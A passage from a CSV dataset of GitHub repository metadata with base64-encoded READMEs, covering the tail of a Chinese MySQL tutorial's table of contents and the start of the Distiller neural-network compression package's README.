name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
remHjeWQr215c3Fs5pyN5YqhKQogICAgLSBb5Zu+5YOP55WM6Z2i5ZCv5Yqo
5YWz6Zet6YeN5ZCvTXlTUUzmnI3liqFdKGNoYXB0ZXIyLzIuMy5tZCPlm77l
g4/nlYzpnaLlkK/liqjlhbPpl63ph43lkK9teXNxbOacjeWKoSkKICAgIC0g
W+afpeeci+WIneWni+WvhueggV0oY2hhcHRlcjIvMi4zLm1kI+afpeeci+WI
neWni+WvhueggSkKICAgIC0gW+iuvue9ruWIneWni+WMluWvhueggV0oY2hh
cHRlcjIvMi4zLm1kI+iuvue9ruWIneWni+WMluWvhueggSkKICAgIC0gW+WQ
r+WKqOaKpemUmeWkhOeQhl0oY2hhcHRlcjIvMi4zLm1kI+WQr+WKqOaKpemU
meWkhOeQhikKLSAyLjQgW015U1FM5bel5YW3XShjaGFwdGVyMi8yLjQubWQp
CiAgICAtIFvlkb3ku6TooYzkvb/nlKjnqIvluo9dKGNoYXB0ZXIyLzIuNC5t
ZCPlkb3ku6TooYzkvb/nlKjnqIvluo8pCiAgICAtIFtNeVNRTCBXb3JrYmVu
Y2jlrqLmiLfnq69dKGNoYXB0ZXIyLzIuNC5tZCNteXNxbC13b3JrYmVuY2jl
rqLmiLfnq68pCiAgICAtIFvluLjnlKjlm77lvaLnrqHnkIblt6XlhbddKGNo
YXB0ZXIyLzIuNC5tZCPluLjnlKjlm77lvaLnrqHnkIblt6XlhbcpCiAgICAt
IFtNeUNsaeabv+S7o015U1FM55qEbXlzcWzlkb3ku6TooYzlt6XlhbddKGNo
YXB0ZXIyLzIuNC5tZCNteWNsaeabv+S7o215c3Fs55qEbXlzcWzlkb3ku6To
oYzlt6XlhbcpCi0gMi41IFtNeVNRTOmFjee9ruS/ruaUuV0oY2hhcHRlcjIv
Mi41Lm1kKQogICAgLSBbTXlTUUzlronoo4Xnm67lvZXor7TmmI5dKGNoYXB0
ZXIyLzIuNS5tZCNteXNxbOWuieijheebruW9leivtOaYjikKICAgIC0gW+mF
jee9ruaWh+S7tueahOS9jee9rl0oY2hhcHRlcjIvMi41Lm1kI+mFjee9ruaW
h+S7tueahOS9jee9rikKICAgIC0gW1dpbmRvd3Pns7vnu5/phY3nva7mlofk
u7bor7vlj5ZdKGNoYXB0ZXIyLzIuNS5tZCN3aW5kb3dz57O757uf6YWN572u
5paH5Lu26K+75Y+WKQogICAgLSBbTGludXjns7vnu5/phY3nva7mlofku7bo
r7vlj5ZdKGNoYXB0ZXIyLzIuNS5tZCNsaW51eOezu+e7n+mFjee9ruaWh+S7
tuivu+WPlikKICAgIC0gW+mFjee9ruaWh+S7tuWGheWuuV0oY2hhcHRlcjIv
Mi41Lm1kI+mFjee9ruaWh+S7tuWGheWuuSkKCiMjIyMg56ysM+eroCDmlbDm
ja7lupPnmoTln7rmnKzmk43kvZwKCi0gMy4xIFvov57mjqXmlbDmja7lupNd
KGNoYXB0ZXIzLzMuMS5tZCkKICAgIC0gW015U1FM5ZG95Luk6K+t5rOVXShj
aGFwdGVyMy8zLjEubWQjbXlzcWzlkb3ku6Tor63ms5UpCiAgICAtIFtNeVNR
TOWRveS7pOi/nuaOpeaVsOaNruW6k10oY2hhcHRlcjMvMy4xLm1kI215c3Fs
5ZG95Luk6L+e5o6l5pWw5o2u5bqTKQogICAgLSBb5byA5ZCvTXlTUUznmoTo
v5znqIvluJDlj7ddKGNoYXB0ZXIzLzMuMS5tZCPlvIDlkK9teXNxbOeahOi/
nOeoi+W4kOWPtykKICAgIC0gW015U1FM5L+u5pS55a+G56CBXShjaGFwdGVy
My8zLjEubWQjbXlzcWzkv67mlLnlr4bnoIEpCi0gMy4yIFvmn6XnnIvpgInm
i6nmlbDmja7lupNdKGNoYXB0ZXIzLzMuMi5tZCkKICAgIC0gW+afpeeci+aV
sOaNruW6k10oY2hhcHRlcjMvMy4yLm1kI+afpeeci+aVsOaNruW6kykKICAg
IC0gW+mAieaLqeaVsOaNruW6k10oY2hhcHRlcjMvMy4yLm1kI+mAieaLqeaV
sOaNruW6kykKLSAzLjMgW+WIm+W7uuaVsOaNruW6k10oY2hhcHRlcjMvMy4z
Lm1kKQogICAgLSBbU1FM6K+t5Y+l5Yib5bu65pWw5o2u5bqTXShjaGFwdGVy
My8zLjQubWQjc3Fs6K+t5Y+l5Yib5bu65pWw5o2u5bqTKQogICAgLSBb566h
55CG5bel5YW35Yib5bu65pWw5o2u5bqTXShjaGFwdGVyMy8zLjQubWQj566h
55CG5bel5YW35Yib5bu65pWw5o2u5bqTKQotIDMuNCBb5Yig6Zmk5pWw5o2u
5bqTXShjaGFwdGVyMy8zLjQubWQpCiAgICAtIFtTUUzor63lj6XliKDpmaTm
lbDmja7lupNdKGNoYXB0ZXIzLzMuNC5tZCNzcWzor63lj6XliKDpmaTmlbDm
ja7lupMpCiAgICAtIFvnrqHnkIblt6XlhbfliKDpmaTmlbDmja7lupNdKGNo
YXB0ZXIzLzMuNC5tZCPnrqHnkIblt6XlhbfliKDpmaTmlbDmja7lupMpCi0g
My41IFvmlbDmja7lupPlrZjlgqjlvJXmk45dKGNoYXB0ZXIzLzMuNS5tZCMp
CiAgICAtIFvlrZjlgqjlvJXmk47nroDku4tdKGNoYXB0ZXIzLzMuNS5tZCPl
rZjlgqjlvJXmk47nroDku4spCiAgICAtIFvluLjnlKjlvJXmk47lr7nmr5Rd
KGNoYXB0ZXIzLzMuNS5tZCPluLjnlKjlvJXmk47lr7nmr5QpCiAgICAtIFvm
n6XnnIvlrZjlgqjlvJXmk45dKGNoYXB0ZXIzLzMuNS5tZCPmn6XnnIvlrZjl
gqjlvJXmk44pCiAgICAtIFvorr7nva7lrZjlgqjlvJXmk45dKGNoYXB0ZXIz
LzMuNS5tZCPorr7nva7lrZjlgqjlvJXmk44pCiAgICAtIFvlpoLkvZXpgInm
i6nlkIjpgILnmoTlrZjlgqjlvJXmk45dKGNoYXB0ZXIzLzMuNS5tZCPlpoLk
vZXpgInmi6nlkIjpgILnmoTlrZjlgqjlvJXmk44pCgojIyMjIOesrDTnq6Ag
5pWw5o2u6KGo55qE5Z+65pys5pON5L2cCgotIDQuMSDliJvlu7rmlbDmja7o
oagKCiMjIyMg56ysNeeroCDmlbDmja7nsbvlnovlkozov5DnrpfnrKYKCiMj
IyMg56ysNueroCBNeVNRTOWHveaVsAoKIyMjIyDnrKw356ugIOafpeivouaV
sOaNrgoKIyMjIyDnrKw456ugIOaPkuWFpeOAgeabtOaWsOS4juWIoOmZpOaV
sOaNrgoKIyMjIyDnrKw556ugIOe0ouW8lQoKIyMjIyDnrKwxMOeroCDlrZjl
gqjov4fnqIvlkozlh73mlbAKCiMjIyMg56ysMTHnq6Ag6KeG5Zu+CgojIyMj
IOesrDEy56ugIE15U1FM5Ye95pWwCgojIyMjIOesrDEz56ugIE15U1FM55So
5oi3566h55CGCgojIyMjIOesrDE056ugIOaVsOaNruWkh+S7veS4jui/mOWO
nwoKIyMjIyDnrKwxNeeroCBNeVNRTOaXpeW/lwoKIyMjIyDnrKwxNueroCDm
gKfog73kvJjljJYKCiMjIyMg56ysMTfnq6Ag5ZCE56eN6Zeu6aKY6Kej5Yaz
CgotIFvorqlNeVNRTOaUr+aMgWVtb2pp5Zu+5qCH5a2Y5YKoXShjaGFwdGVy
MTcvMTcuMS5tZCkKLSBbQ2VudG9zNuS4i+WNh+e6p015U1FM5pWw5o2u5bqT
XShjaGFwdGVyMTcvMTcuMi5tZCkKLSBbTXlTUUzkv67mlLnlr4bnoIFdKGNo
YXB0ZXIxNy8xNy4zLm1kKQogICAgLSBbbXlzcWxkX3NhZmXkuI3lrZjlnKjk
v67mlLnlr4bnoIFdKGNoYXB0ZXIxNy8xNy4zLm1kI215c3FsZF9zYWZl5LiN
5a2Y5Zyo5L+u5pS55a+G56CBKQogICAgLSBb5ZCv5Yqo5L+u5pS55Lii5aSx
55qEbXlzcWzljZXlrp7kvotyb2905a+G56CB5pa55rOVXShjaGFwdGVyMTcv
MTcuMy5tZCPlkK/liqjkv67mlLnkuKLlpLHnmoRteXNxbOWNleWunuS+i3Jv
b3Tlr4bnoIHmlrnms5UpCiAgICAtIFtNYWPkuIvph43nva5NeVNRTOeahHJv
b3Tlr4bnoIFdKGNoYXB0ZXIxNy8xNy4zLm1kI01hY+S4i+mHjee9rk15U1FM
55qEcm9vdOWvhueggSkKICAgIC0gW+S4jemHjeWQr215c3FsZOS/ruaUueWv
hueggeeahOaWueazlV0oY2hhcHRlcjE3LzE3LjMubWQj5LiN6YeN5ZCvbXlz
cWxk55qE5pa55rOVKQotIFtDZW50b3M3IOm7mOiupOS4uk1hcmlhRELlr7zo
h7RteXNxbOWuieijheS4jeS4il0oY2hhcHRlcjIvMi4yLm1kI2NlbnRvczfl
ronoo4VteXNxbCkKLSBbbXlzcWzlkb3ku6TkuI3lrZjlnKhdKGNoYXB0ZXIy
LzIuMS5tZCNteXNxbOWRveS7pOS4jeWtmOWcqCkKLSBbTXlTUUzmnI3liqHl
kK/liqjlpLHotKXop6PlhrPmlrnmoYhdKGNoYXB0ZXIyLzIuMy5tZCNsaW51
eC3kuIvlkb3ku6Tmk43kvZwpCi0gW+WvhueggeS4jea7oei2s+W9k+WJjeea
hOetlueVpeimgeaxguWvvOiHtOaXoOazleW8gOWQr+i/nOeoi+W4kOWPt10o
Y2hhcHRlcjMvMy4xLm1kI+W8gOWQr215c3Fs55qE6L+c56iL5biQ5Y+3KQoK
CiMjIOivu+iAheWvueixoQoK5pW05pys5Lmm55uu5b2V6KeE5YiS5Y+C6ICD
5LqG5YW25a6D5Yeg5pysIE15U1FMIOS5puexjeebruW9leinhOWIkueahO+8
jOWcqOaIkei+ueWtpuS5oOi+ueaVtOeQhueahOi/h+eoi+WPr+iDveacieS/
ruaUue+8jOi/meS4qui/h+eoi+acieeCueaFou+8jOW4jOacm+iDveWujOaI
kO+8jOaJgOS7peaVmeeoi+mAguWQiOS7peS4i+ivu+iAheWtpuS5oOmYheiv
u+S9v+eUqO+8mgoKLSBNeVNRTCDmlbDmja7lupPliJ3lrabogIXjgIIKLSDl
r7nmlbDmja7lupPlvIDlj5HmhJ/lhbTotqPvvIzluIzmnJvlv6vpgJ/jgIHl
hajpnaLmjozmj6EgTXlTUUwg55qE5Lq65ZGY44CCCi0g5a+55YW25LuW5pWw
5o2u5bqT5pyJ5LiA5a6a55qE5LqG6Kej77yM5oOz6L2s5YiwIE15U1FMIOW5
s+WPsOS9v+eUqOWug+eahOW8gOWPkeiAheOAggotIOWDj+aIkeS4gOagt+ii
q+mAvOaXoOWliOS9v+eUqCBNeVNRTCDmlbDmja7lupPnmoTkurrjgIIKCuS7
juebruW9leadpeeci++8jOeci+S4iuWOu+WGheWuueS4sOWvjO+8jOavlOi+
g+WujOaVtOeahOS7i+e7jeS6hiBNeVNRTCDmlbDmja7lupPmioDmnK/nmoTm
lZnnqIvvvIzmiJHkuI3mmK9gREJBYO+8jOaIkeS4jeaYr++8jOato+WcqOec
i+i/meevh+aWh+eroOeahOS9oO+8jOW+iOWPr+iDveS5n+S4jeaYr++8jOS4
jeaDs+ivr+S6uuWtkOW8n++8jOWcqOmhueebruS4reW6lOeUqOS6huS4gOau
teaXtumXtCBNeVNRTO+8jOWmguaenOS9oOaYr2BEQkFg6K+35aSa5aSa5oyH
5pWZ77yM5paH6YeH5LiN5L2z6L+Y5pyb6auY5oqs6LS15omL77yM5LiN55Sa
5oSf5r+A77yM5bCP5byf5Zyo6L+Z6YeM57uZ5oKo6Z6g6Lqs77yM5qyi6L+O
57uZ5oiR57qg6ZSZ44CCCgrmiJHmg7Plv7XkuIDkuKrlpbPlranlhL/vvIzl
rp7lsZ7ml6DlpYjmiJHlvpfnu6fnu63liqrlipvvvIzlpb3lpb3or7vkuabl
gZrkuKrmnInotqPnmoTkurrvvIzlrozmiJDmiJHnmoTigJzokZfkvZzigJ3v
vIzlvoXmiJHokZfkvZzlrozmiJDlj6/lkKbot5/miJHnuqbkuKrkvJrvvJ8K
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'distiller',130871393,b'Neural Network Distiller by Intel AI Lab: a Python package for neural network compression research.  https://nervanasystems.github.io/distiller',b'Jupyter Notebook',91,2392,,2392,False,b'https://api.github.com/repos/NervanaSystems/distiller/forks',"PGNlbnRlcj4gPGltZyBzcmM9ImltZ3MvYmFubmVyMS5wbmciPjwvY2VudGVy
PgoKWyFbTGljZW5zZV0oaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9iYWRnZS9M
aWNlbnNlLUFwYWNoZSUyMDIuMC1ibHVlLnN2ZyldKGh0dHBzOi8vZ2l0aHVi
LmNvbS9OZXJ2YW5hU3lzdGVtcy9kaXN0aWxsZXIvYmxvYi9tYXN0ZXIvTElD
RU5TRSkKWyFbRE9JXShodHRwczovL3plbm9kby5vcmcvYmFkZ2UvMTMwODcx
MzkzLnN2ZyldKGh0dHBzOi8vemVub2RvLm9yZy9iYWRnZS9sYXRlc3Rkb2kv
MTMwODcxMzkzKQoKPGRpdiBhbGlnbj0iY2VudGVyIj4KICA8aDM+CiAgICA8
YSBocmVmPSJodHRwczovL2dpdGh1Yi5jb20vTmVydmFuYVN5c3RlbXMvZGlz
dGlsbGVyL3dpa2kiPgogICAgICBXaWtpIGFuZCB0dXRvcmlhbHMKICAgIDwv
YT4KICAgIDxzcGFuPiB8IDwvc3Bhbj4KICAgIDxhIGhyZWY9Imh0dHBzOi8v
bmVydmFuYXN5c3RlbXMuZ2l0aHViLmlvL2Rpc3RpbGxlci9pbmRleC5odG1s
Ij4KICAgICAgRG9jdW1lbnRhdGlvbgogICAgPC9hPgogICAgPHNwYW4+IHwg
PC9zcGFuPgogICAgPGEgaHJlZj0iI2dldHRpbmctc3RhcnRlZCI+CiAgICAg
IEdldHRpbmcgU3RhcnRlZAogICAgPC9hPgogICAgPHNwYW4+IHwgPC9zcGFu
PgogICAgPGEgaHJlZj0iaHR0cHM6Ly9uZXJ2YW5hc3lzdGVtcy5naXRodWIu
aW8vZGlzdGlsbGVyL2FsZ29fcHJ1bmluZy5odG1sIj4KICAgICAgQWxnb3Jp
dGhtcwogICAgPC9hPgogICAgPHNwYW4+IHwgPC9zcGFuPgogICAgPGEgaHJl
Zj0iaHR0cHM6Ly9uZXJ2YW5hc3lzdGVtcy5naXRodWIuaW8vZGlzdGlsbGVy
L2Rlc2lnbi5odG1sIj4KICAgICAgRGVzaWduCiAgICA8L2E+CiAgICA8c3Bh
bj4gfCA8L3NwYW4+CiAgICA8YSBocmVmPSJodHRwczovL2dpdGh1Yi5jb20v
TmVydmFuYVN5c3RlbXMvZGlzdGlsbGVyL3dpa2kvRnJlcXVlbnRseS1Bc2tl
ZC1RdWVzdGlvbnMtKEZBUSkiPgogICAgICBGQVEKICAgIDwvYT4KICA8L2gz
Pgo8L2Rpdj4KCioqRGlzdGlsbGVyKiogaXMgYW4gb3Blbi1zb3VyY2UgUHl0
aG9uIHBhY2thZ2UgZm9yIG5ldXJhbCBuZXR3b3JrIGNvbXByZXNzaW9uIHJl
c2VhcmNoLgoKTmV0d29yayBjb21wcmVzc2lvbiBjYW4gcmVkdWNlIHRoZSBt
ZW1vcnkgZm9vdHByaW50IG9mIGEgbmV1cmFsIG5ldHdvcmssIGluY3JlYXNl
IGl0cyBpbmZlcmVuY2Ugc3BlZWQgYW5kIHNhdmUgZW5lcmd5LiBEaXN0aWxs
ZXIgcHJvdmlkZXMgYSBbUHlUb3JjaF0oaHR0cDovL3B5dG9yY2gub3JnLykg
ZW52aXJvbm1lbnQgZm9yIHByb3RvdHlwaW5nIGFuZCBhbmFseXppbmcgY29t
cHJlc3Npb24gYWxnb3JpdGhtcywgc3VjaCBhcyBzcGFyc2l0eS1pbmR1Y2lu
ZyBtZXRob2RzIGFuZCBsb3ctcHJlY2lzaW9uIGFyaXRobWV0aWMuCgojIyMj
IE5vdGUgb24gUmVsZWFzZSAwLjMgLSBQb3NzaWJsZSBCUkVBS0lORyBDaGFu
Z2VzCgpBcyBvZiByZWxlYXNlIDAuMywgd2UndmUgbW92ZWQgc29tZSBjb2Rl
IGFyb3VuZCB0byBlbmFibGUgcHJvcGVyIHBhY2thZ2luZyBhbmQgaW5zdGFs
bGF0aW9uIG9mIERpc3RpbGxlci4gSW4gYWRkaXRpb24sIHdlIHVwZGF0ZWQg
RGlzdGlsbGVyIHRvIHN1cHBvcnQgUHlUb3JjaCAxLlgsIHdoaWNoIG1pZ2h0
IGFsc28gY2F1c2Ugb2xkZXIgY29kZSB0byBicmVhayBkdWUgdG8gc29tZSBB
UEkgY2hhbmdlcy4gIApJZiB1cGRhdGluZyBmcm9tIGFuIGVhcmxpZXIgcmV2
aXNpb24gb2YgdGhlIGNvZGUsIHBsZWFzZSBtYWtlIHN1cmUgdG8gZm9sbG93
IHRoZSBpbnN0cnVjdGlvbnMgaW4gdGhlIFtpbnN0YWxsXSgjaW5zdGFsbC10
aGUtcGFja2FnZSkgc2VjdGlvbiB0byBtYWtlIHN1cmUgcHJvcGVyIGluc3Rh
bGxhdGlvbiBvZiBEaXN0aWxsZXIgYW5kIGFsbCBkZXBlbmRlbmNpZXMuCgoK
IyMgVGFibGUgb2YgQ29udGVudHMKCi0gW1RhYmxlIG9mIENvbnRlbnRzXSgj
dGFibGUtb2YtY29udGVudHMpCi0gW0hpZ2hsaWdodGVkIGZlYXR1cmVzXSgj
aGlnaGxpZ2h0ZWQtZmVhdHVyZXMpCi0gW0luc3RhbGxhdGlvbl0oI2luc3Rh
bGxhdGlvbikKICAtIFtDbG9uZSBEaXN0aWxsZXJdKCNjbG9uZS1kaXN0aWxs
ZXIpCiAgLSBbQ3JlYXRlIGEgUHl0aG9uIHZpcnR1YWwgZW52aXJvbm1lbnRd
KCNjcmVhdGUtYS1weXRob24tdmlydHVhbC1lbnZpcm9ubWVudCkKICAgIC0g
W1VzaW5nIHZpcnR1YWxlbnZdKCN1c2luZy12aXJ0dWFsZW52KQogICAgLSBb
VXNpbmcgdmVudl0oI3VzaW5nLXZlbnYpCiAgICAtIFtBY3RpdmF0ZSB0aGUg
ZW52aXJvbm1lbnRdKCNhY3RpdmF0ZS10aGUtZW52aXJvbm1lbnQpCiAgLSBb
SW5zdGFsbCB0aGUgcGFja2FnZV0oI2luc3RhbGwtdGhlLXBhY2thZ2UpCi0g
W0dldHRpbmcgU3RhcnRlZF0oI2dldHRpbmctc3RhcnRlZCkKICAtIFtFeGFt
cGxlIGludm9jYXRpb25zIG9mIHRoZSBzYW1wbGUgYXBwbGljYXRpb25dKCNl
eGFtcGxlLWludm9jYXRpb25zLW9mLXRoZS1zYW1wbGUtYXBwbGljYXRpb24p
CiAgICAtIFtUcmFpbmluZy1vbmx5XSgjdHJhaW5pbmctb25seSkKICAgIC0g
W0dldHRpbmcgcGFyYW1ldGVyIHN0YXRpc3RpY3Mgb2YgYSBzcGFyc2lmaWVk
IG1vZGVsXSgjZ2V0dGluZy1wYXJhbWV0ZXItc3RhdGlzdGljcy1vZi1hLXNw
YXJzaWZpZWQtbW9kZWwpCiAgICAtIFtQb3N0LXRyYWluaW5nIHF1YW50aXph
dGlvbl0oI3Bvc3QtdHJhaW5pbmctcXVhbnRpemF0aW9uKQogIC0gW0V4cGxv
cmUgdGhlIHNhbXBsZSBKdXB5dGVyIG5vdGVib29rc10oI2V4cGxvcmUtdGhl
LXNhbXBsZS1qdXB5dGVyLW5vdGVib29rcykKLSBbU2V0IHVwIHRoZSBjbGFz
c2lmaWNhdGlvbiBkYXRhc2V0c10oI3NldC11cC10aGUtY2xhc3NpZmljYXRp
b24tZGF0YXNldHMpCi0gW1J1bm5pbmcgdGhlIHRlc3RzXSgjcnVubmluZy10
aGUtdGVzdHMpCi0gW0dlbmVyYXRpbmcgdGhlIEhUTUwgZG9jdW1lbnRhdGlv
biBzaXRlXSgjZ2VuZXJhdGluZy10aGUtaHRtbC1kb2N1bWVudGF0aW9uLXNp
dGUpCi0gW0J1aWx0IFdpdGhdKCNidWlsdC13aXRoKQotIFtWZXJzaW9uaW5n
XSgjdmVyc2lvbmluZykKLSBbTGljZW5zZV0oI2xpY2Vuc2UpCi0gW0NvbW11
bml0eV0oI2NvbW11bml0eSkKLSBbQWNrbm93bGVkZ21lbnRzXSgjYWNrbm93
bGVkZ21lbnRzKQotIFtEaXNjbGFpbWVyXSgjZGlzY2xhaW1lcikKCiMjIEhp
Z2hsaWdodGVkIGZlYXR1cmVzCiogKipBdXRvbWF0aWMgQ29tcHJlc3Npb24q
KgogIC0gW0F1dG9tYXRlZCBNb2RlbCBDb21wcmVzc2lvbl0oaHR0cHM6Ly9n
aXRodWIuY29tL05lcnZhbmFTeXN0ZW1zL2Rpc3RpbGxlci9ibG9iL21hc3Rl
ci9leGFtcGxlcy9hdXRvX2NvbXByZXNzaW9uL2FtYykgKEFNQykKKiAqKldl
aWdodCBwcnVuaW5nKioKICAtIEVsZW1lbnQtd2lzZSBwcnVuaW5nIHVzaW5n
IG1hZ25pdHVkZSB0aHJlc2hvbGRpbmcsIHNlbnNpdGl2aXR5IHRocmVzaG9s
ZGluZywgdGFyZ2V0IHNwYXJzaXR5IGxldmVsLCBhbmQgYWN0aXZhdGlvbiBz
dGF0aXN0aWNzIAoqICoqU3RydWN0dXJlZCBwcnVuaW5nKioKICAtIENvbnZv
bHV0aW9uOiAyRCAoa2VybmVsLXdpc2UpLCAzRCAoZmlsdGVyLXdpc2UpLCA0
RCAobGF5ZXItd2lzZSksIGFuZCBjaGFubmVsLXdpc2Ugc3RydWN0dXJlZCBw
cnVuaW5nLiAgCiAgLSBGdWxseS1jb25uZWN0ZWQ6IGNvbHVtbi13aXNlIGFu
ZCByb3ctd2lzZSBzdHJ1Y3R1cmVkIHBydW5pbmcuCiAgLSBTdHJ1Y3R1cmUg
Z3JvdXBzIChlLmcuIHN0cnVjdHVyZXMgb2YgNCBmaWx0ZXJzKS4KICAtIFN0
cnVjdHVyZS1yYW5raW5nIHdpdGggdXNpbmcgd2VpZ2h0cyBvciBhY3RpdmF0
aW9ucyBjcml0ZXJpYSAoTHAtbm9ybSwgQVBvWiwgZ3JhZGllbnRzLCByYW5k
b20sIGV0Yy4pLgogIC0gU3VwcG9ydCBmb3IgbmV3IHN0cnVjdHVyZXMgKGUu
Zy4gYmxvY2sgcHJ1bmluZykKKiAqKkNvbnRyb2wqKgogIC0gU29mdCAobWFz
ayBvbiBmb3J3YXJkLXBhc3Mgb25seSkgYW5kIGhhcmQgcHJ1bmluZyAocGVy
bWFuZW50bHkgZGlzY29ubmVjdCBuZXVyb25zKQogIC0gRHVhbCB3ZWlnaHQg
Y29waWVzIChjb21wdXRlIGxvc3Mgb24gbWFza2VkIHdlaWdodHMsIGJ1dCB1
cGRhdGUgdW5tYXNrZWQgd2VpZ2h0cykgIAogIC0gTW9kZWwgdGhpbm5pbmcg
KEFLQSAibmV0d29yayBnYXJiYWdlIHJlbW92YWwiKSB0byBwZXJtYW5lbnRs
eSByZW1vdmUgcHJ1bmVkIG5ldXJvbnMgYW5kIGNvbm5lY3Rpb25zLgoqICoq
U2NoZWR1bGUqKgogIC0gRmxleGlibGUgc2NoZWR1bGluZyBvZiBwcnVuaW5n
LCByZWd1bGFyaXphdGlvbiwgYW5kIGxlYXJuaW5nIHJhdGUgZGVjYXkgKGNv
bXByZXNzaW9uIHNjaGVkdWxpbmcpCiAgLSBPbmUtc2hvdCBhbmQgaXRlcmF0
aXZlIHBydW5pbmcgKGFuZCBmaW5lLXR1bmluZykgYXJlIHN1cHBvcnRlZC4K
ICAtIEVhc2lseSBjb250cm9sIHdoYXQgaXMgcGVyZm9ybWVkIGVhY2ggdHJh
aW5pbmcgc3RlcCAoZS5nLiBncmVlZHkgbGF5ZXIgYnkgbGF5ZXIgcHJ1bmlu
ZyB0byBmdWxsIG1vZGVsIHBydW5pbmcpLiAKICAtIEF1dG9tYXRpYyBncmFk
dWFsIHNjaGVkdWxlIChBR1ApIGZvciBwcnVuaW5nIGluZGl2aWR1YWwgY29u
bmVjdGlvbnMgYW5kIGNvbXBsZXRlIHN0cnVjdHVyZXMuCiAgLSBUaGUgY29t
cHJlc3Npb24gc2NoZWR1bGUgaXMgZXhwcmVzc2VkIGluIGEgWUFNTCBmaWxl
IHNvIHRoYXQgYSBzaW5nbGUgZmlsZSBjYXB0dXJlcyB0aGUgZGV0YWlscyBv
ZiBleHBlcmltZW50cy4gIFRoaXMgW2RlcGVuZGVuY3kgaW5qZWN0aW9uXSho
dHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9EZXBlbmRlbmN5X2luamVj
dGlvbikgZGVzaWduIGRlY291cGxlcyB0aGUgRGlzdGlsbGVyIHNjaGVkdWxl
ciBhbmQgbGlicmFyeSBmcm9tIGZ1dHVyZSBleHRlbnNpb25zIG9mIGFsZ29y
aXRobXMuCiogRWxlbWVudC13aXNlIGFuZCBmaWx0ZXItd2lzZSBwcnVuaW5n
ICoqc2Vuc2l0aXZpdHkgYW5hbHlzaXMqKiAodXNpbmcgTDEtbm9ybSB0aHJl
c2hvbGRpbmcpLiBFeGFtaW5lIHRoZSBkYXRhIGZyb20gc29tZSBvZiB0aGUg
bmV0d29ya3Mgd2UgYW5hbHl6ZWQsIHVzaW5nIFt0aGlzIG5vdGVib29rXSho
dHRwczovL2dpdGh1Yi5jb20vTmVydmFuYVN5c3RlbXMvZGlzdGlsbGVyL2Js
